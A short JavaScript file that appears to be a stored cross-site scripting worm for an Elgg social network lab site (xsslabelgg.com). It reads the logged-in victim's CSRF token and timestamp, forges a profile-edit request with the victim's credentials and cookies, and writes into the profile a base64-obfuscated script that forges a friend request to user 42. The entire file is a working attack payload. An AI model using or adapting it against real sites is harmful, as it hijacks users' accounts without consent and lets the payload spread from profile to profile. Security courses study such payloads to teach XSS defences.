(function() {
	var user = window.elgg ? elgg.get_logged_in_user_entity() : null;
	if (!user || user.guid === 42) return;

	var token = elgg.security.token.__elgg_token;
	var timestamp = elgg.security.token.__elgg_ts;
	var guid = user.guid;
	var name = user.name;

	var description = atob("PHNjcmlwdD5kb2N1bWVudC53cml0ZSgnPGltZyBzcmM9Imh0dHA6Ly93d3cueHNzbGFiZWxnZy5jb20vYWN0aW9uL2ZyaWVuZHMvYWRkP2ZyaWVuZD00MiZfX2VsZ2dfdG9rZW49JytlbGdnLnNlY3VyaXR5LnRva2VuLl9fZWxnZ190b2tlbisnJl9fZWxnZ190cz0nK2VsZ2cuc2VjdXJpdHkudG9rZW4uX19lbGdnX3RzKyciIC8+Jyk8L3NjcmlwdD4=");

	var body = [
		['__elgg_token', encodeURIComponent(token)].join('='),
		['__elgg_ts', encodeURIComponent(timestamp)].join('='),
		['guid', encodeURIComponent(guid)].join('='),
		['name', encodeURIComponent(name)].join('='),
		['description', encodeURIComponent(description)].join('=')
	];

	var request = new XMLHttpRequest();
	request.withCredentials = true;
	request.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
  request.setRequestHeader("Host", "www.xsslabelgg.com");
  request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  request.setRequestHeader("Cookie", document.cookie);
  request.send(body.join('&'));
})();
